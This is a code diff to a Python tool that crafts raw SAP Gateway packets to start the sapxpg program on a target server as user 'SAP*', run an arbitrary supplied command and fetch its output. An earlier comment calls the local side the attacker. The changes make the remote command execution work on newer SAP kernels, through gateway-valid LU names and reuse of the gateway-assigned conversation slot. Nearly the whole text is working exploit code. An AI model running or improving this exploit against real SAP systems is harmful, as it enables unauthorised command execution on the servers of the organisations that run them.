@@ -228,8 +228,20 @@ def build_saprfcextend(dest_name, ncpic_lu, ncpic_tp, ctype=0x45, client_info=1,
     return e
 
 
-def build_saprf_dt_struct(target_ip, long_tp="sapxpg"):
-    """Build SAPRFCDTStruct (340 bytes) for STARTED_PRG init."""
+def build_saprf_dt_struct(target_ip, long_tp="sapxpg", target_hostname=None):
+    """Build SAPRFCDTStruct (340 bytes) for STARTED_PRG init.
+
+    target_hostname: SAP server hostname (e.g. "s4hanadev").  The GW validates
+    long_lu against [a-z0-9-]; using an IP with dots causes "lu name invalid".
+    Falls back to target_ip with dots→hyphens when target_hostname is None.
+    """
+    # long_lu must be a valid hostname [a-z0-9-].  Use caller-supplied hostname
+    # (e.g. "s4hanadev") or derive from IP by replacing dots with hyphens.
+    if target_hostname:
+        long_lu = target_hostname
+    else:
+        long_lu = target_ip.replace(".", "-")   # "192-168-2-209" — valid
+
     # IPv6-mapped IPv4 for local_addrv6 = "::192.168.x.x"
     ipv6_mapped = b"\x00" * 12 + ip_to_bytes(target_ip)
 
@@ -245,7 +257,7 @@ def build_saprf_dt_struct(target_ip, long_tp="sapxpg"):
     d += struct.pack("B", 0)                            # start_type = DEFAULT
     d += struct.pack("B", 10)                           # net_protocol
     d += ipv6_mapped                                    # local_addrv6 (16 bytes)
-    d += pad_right_null(target_ip, 128)                 # long_lu (128 bytes)
+    d += pad_right_null(long_lu, 128)                   # long_lu (128 bytes)
     d += b"\x00" * 16                                   # padd3
     d += pad_right("SAP*", 12, b" ")                     # user (12 bytes, space-padded)
     d += b"\x20" * 8                                    # padd4
@@ -260,7 +272,7 @@ def build_saprf_dt_struct(target_ip, long_tp="sapxpg"):
     return d
 
 
-def build_p2(target_ip, dest_name="T_75", local_ip=None):
+def build_p2(target_ip, dest_name="T_75", local_ip=None, target_hostname=None):
     """Build F_SAP_INIT packet (452 bytes).
 
     info2=0x01 (WITH_LONG_LU_NAME)
@@ -281,14 +293,16 @@ def build_p2(target_ip, dest_name="T_75", local_ip=None):
                source address, e.g. "10.10.1") so the gateway also sees a
                valid and consistent LU address.
     """
-    # Build ncpic_lu: up to 7 chars of the local (attacker) IP so the 8th
-    # byte is always \x00 (pad_right_null guarantees this when len < 8).
+    # Build ncpic_lu: identifier for our side (≤7 chars so pad_right_null guarantees
+    # a NUL terminator in the 8-byte field).  Must be [a-z0-9-] only — the GW
+    # rejects names with dots/underscores as "lu name invalid" (note 975044).
+    # Replace dots with hyphens and truncate to 7 chars.
     if local_ip:
-        lu = local_ip[:7]   # e.g. "10.10.1" from "10.10.1.100"
+        lu = local_ip.replace(".", "-")[:7]   # e.g. "192-168" from "192.168.2.210"
     else:
-        lu = "10.10.1"      # safe fallback, always < 8 chars
+        lu = "192-168"      # safe fallback, always ≤7 chars, no dots
 
-    dt = build_saprf_dt_struct(target_ip)
+    dt = build_saprf_dt_struct(target_ip, target_hostname=target_hostname)
 
     header = build_saprfc_header_v6(
         func_type=0xCA,         # F_SAP_INIT = 202
@@ -590,7 +604,7 @@ def build_sapcpic(target_ip, hostname, sid, instance, kernel, dest, client, comm
     return c
 
 
-def build_p3(conv_id, target_ip, hostname, sid, instance, kernel, dest, client, command, params, long_params=None):
+def build_p3(conv_id, target_ip, hostname, sid, instance, kernel, dest, client, command, params, long_params=None, gw_id=0):
     """Build F_SAP_SEND packet with SAPXPG_START_XPG_LONG.
 
     info = SYNC_CPIC_FUNCTION + WITH_GW_SAP_PARAMS_HDR + R3_CPIC_LOGIN_WITH_TERM
@@ -598,12 +612,13 @@ def build_p3(conv_id, target_ip, hostname, sid, instance, kernel, dest, client, 
     vector = F_V_SEND_DATA(bit2) + F_V_RECEIVE(bit3) = 0x04 + 0x08 = 0x0C
 
     long_params: if given, overrides the LONG_PARAMS field (see build_saprfxpg).
+    gw_id: conversation slot assigned by GW in P2 response (bytes 6:8).
     """
     cpic = build_sapcpic(target_ip, hostname, sid, instance, kernel, dest, client, command, params, long_params=long_params)
 
     header = build_saprfc_header_v6(
         func_type=0xCB,         # F_SAP_SEND = 203
-        gw_id=1,
+        gw_id=gw_id,
         uid=19,
         info2=0,
         info3=0,
@@ -714,17 +729,18 @@ def build_sapcpic_end(target_ip, hostname, sid, instance, kernel, dest, client):
     return c
 
 
-def build_p4(conv_id, target_ip, hostname, sid, instance, kernel, dest="T_75", client="000"):
+def build_p4(conv_id, target_ip, hostname, sid, instance, kernel, dest="T_75", client="000", gw_id=0):
     """Build F_SAP_SEND packet with SAPXPG_END_XPG.
 
     Uses the full SAPCPIC format (with TH struct and metadata TLVs)
     which works on both older and newer (793+) SAP kernels.
+    gw_id: conversation slot assigned by GW in P2 response (bytes 6:8).
     """
     cpic_end = build_sapcpic_end(target_ip, hostname, sid, instance, kernel, dest, client)
 
     header = build_saprfc_header_v6(
         func_type=0xCB,         # F_SAP_SEND = 203
-        gw_id=1,
+        gw_id=gw_id,
         uid=19,
         info2=0,
         info3=0,
@@ -840,6 +856,7 @@ def parse_response(data, step_name=""):
         "error": False,
         "error_msg": "",
         "conv_id": None,
+        "gw_id": None,
         "strtstat": None,
         "strings_ascii": [],
         "strings_utf16": [],
@@ -863,6 +880,10 @@ def parse_response(data, step_name=""):
                 s2 for s2 in utf16 if len(s2) > 3
             )
             return info
+
+    # Extract gw_id from header bytes 6:8
+    if len(data) >= 8:
+        info["gw_id"] = struct.unpack("!H", data[6:8])[0]
 
     # Extract conversation ID (8-digit decimal string)
     ascii_strings = extract_ascii_strings(data, 8)
@@ -968,7 +989,7 @@ def main():
 
     # Build packets for optional dump (before connecting)
     p1_data = build_p1(args.host, args.instance, accept_info=args.accept_info)
-    p2_data = build_p2(args.host, args.dest)
+    p2_data = build_p2(args.host, args.dest, target_hostname=args.hostname)
 
     if args.dump_packets:
         # Dump P1 and P2 immediately; P3/P4 need conv_id so use placeholder
@@ -1004,9 +1025,12 @@ def main():
     # real local IP so kernel 754 does not silently drop F_SAP_INIT due to a
     # missing NUL or a mismatched LU address.
     local_ip = sock.getsockname()[0]
-    p2_data = build_p2(args.host, args.dest, local_ip=local_ip)
+    p2_data = build_p2(args.host, args.dest, local_ip=local_ip,
+                       target_hostname=args.hostname)
     if args.verbose:
-        print("[*] Local IP: %s  →  ncpic_lu = %r" % (local_ip, local_ip[:7]))
+        ncpic_lu = local_ip.replace(".", "-")[:7]
+        print("[*] Local IP: %s  →  ncpic_lu = %r  long_lu = %r" % (
+            local_ip, ncpic_lu, args.hostname))
 
     # Step 1: GW_NORMAL_CLIENT
     # Wait up to args.timeout for the first (primary) response frame, then drain
@@ -1068,6 +1092,7 @@ def main():
     print("\n[*] Step 2: F_SAP_INIT (STARTED_PRG -> sapxpg)")
     ni_send(sock, p2_data)
     conv_id = None
+    gw_id = 0
     f_sap_init_timed_out = False
     try:
         first_p2 = ni_recv(sock, args.timeout)
@@ -1084,8 +1109,11 @@ def main():
                 sys.exit(1)
             if info["conv_id"] and not conv_id:
                 conv_id = info["conv_id"]
+            if info["gw_id"] is not None and gw_id == 0:
+                gw_id = info["gw_id"]
         if conv_id:
-            print("[+] Conversation ID: %s (from %d frame(s))" % (conv_id, len(p2_frames)))
+            print("[+] Conversation ID: %s  gw_id: %d  (from %d frame(s))" % (
+                conv_id, gw_id, len(p2_frames)))
         else:
             print("[*] No conv_id in F_SAP_INIT response — using fallback")
     except socket.timeout:
@@ -1113,7 +1141,7 @@ def main():
         args.command, args.params))
     p3_data = build_p3(conv_id, args.host, args.hostname, args.sid,
                        args.instance, args.kernel, args.dest, args.client,
-                       args.command, args.params)
+                       args.command, args.params, gw_id=gw_id)
     ni_send(sock, p3_data)
 
     # Wait for the first response frame with full timeout (command execution may
@@ -1179,7 +1207,8 @@ def main():
     elif not args.skip_end_xpg:
         print("\n[*] Step 4: SAPXPG_END_XPG (retrieving output)")
         p4_data = build_p4(conv_id, args.host, args.hostname, args.sid,
-                           args.instance, args.kernel, args.dest, args.client)
+                           args.instance, args.kernel, args.dest, args.client,
+                           gw_id=gw_id)
         ni_send(sock, p4_data)
         try:
             resp = ni_recv(sock, args.timeout)
